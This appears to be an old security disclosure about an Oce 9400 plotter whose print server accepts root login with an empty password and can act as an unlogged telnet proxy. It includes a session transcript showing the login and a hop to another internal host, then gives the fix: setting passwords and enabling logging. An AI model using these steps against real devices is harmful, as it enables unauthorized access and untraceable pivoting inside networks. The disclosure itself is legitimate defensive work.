I sent this information to OCE long ago with no response. I am aware of the Intelligent Peripherals bulletin by CIAC.
</p><p><a href="http://www.ciac.org/ciac/bulletins/j-019.shtml">http://www.ciac.org/ciac/bulletins/j-019.shtml</a>
</p><p>I have a few plotters / printers under my audit umbrella and noticed something interesting on an Oce&amp;#039; 9400 plotter. The printer has the ability to be a telnet proxy. Where as a user can hop via telnet to other hosts. If the printer is not setup properly the connections will go unlogged.
</p><p>bunyip% telnet JPP1<br/>
Trying <a href="telnet://192.168.38.244">192.168.38.244</a>...<br/>
Connected to JPP1.<br/>
Escape character is &amp;#039;^]&amp;#039;.
</p><p>Network Printer Server Version 5.6.3 (<a href="telnet://192.168.38.244">192.168.38.244</a>)
</p><p>login: root<br/>
Password:[Just enter here]
</p><p>Welcome root user
</p><p>WARNING: current and stored values differ. Use &amp;#039;list diff&amp;#039; command to find the differences. Current values will be lost if unit is reset.
</p><p>192.168.38.244:root&amp;gt; telnet <a href="telnet://192.168.38.110">192.168.38.110</a> trying <a href="telnet://192.168.38.110">192.168.38.110</a> ...
Connected to <a href="telnet://192.168.38.110">192.168.38.110</a><br/>
Escape character is &amp;#039;0x18&amp;#039;
</p><p>Red Hat Linux release 5.9 (Starbuck)<br/>
Kernel 2.2.3-5 on an i586<br/>
login:
</p><pre>
             <a href="ftp://192.168.38.244/root">192.168.38.244:root</a>&amp;gt; list sysinfo
             name:
          contact:
         location:
          version: 5.6.3
    serial number: 13029
         compiled: Mar 25 1998    loginfo: sys
          logport:
           syslog: <a href="telnet://255.255.255.255">255.255.255.255</a>
            email: NetPrint@&amp;lt;unconfigured&amp;gt;

         All that is needed is a valid DNS server setup in the plotter
</pre>
<p>configuration.
</p><p>192.168.38.244:root&amp;gt; set sysinfo dns <a href="telnet://192.168.38.100">192.168.38.100</a>
</p><p>And anyone can use the plotter as an anonymous telnet proxy.
</p><p>Fix<br/>
Enable passwords for the accounts on the plotter:
</p><pre>
         syntax: set user add &amp;lt;NAME&amp;gt;
         set user del &amp;lt;NAME&amp;gt;
         set user passwd &amp;lt;NAME&amp;gt; [&amp;lt;PASSWORD&amp;gt;]
         set user type &amp;lt;NAME&amp;gt; root|guest
         set user from default|stored
</pre>
<p>Enable logging:
</p><pre>
         syntax: set logpath &amp;lt;LOGPATH&amp;gt; name &amp;lt;NEW_NAME&amp;gt;
         set logpath &amp;lt;LOGPATH&amp;gt; type [[-]job] [[-]user] [[-]pgcnt] [[-]cksum]
                     [[-]printer] [[-]ioport]
         set logpath &amp;lt;LOGPATH&amp;gt; port &amp;lt;TCP-PORT&amp;gt;|email|syslog
         set logpath from default|stored
</pre>
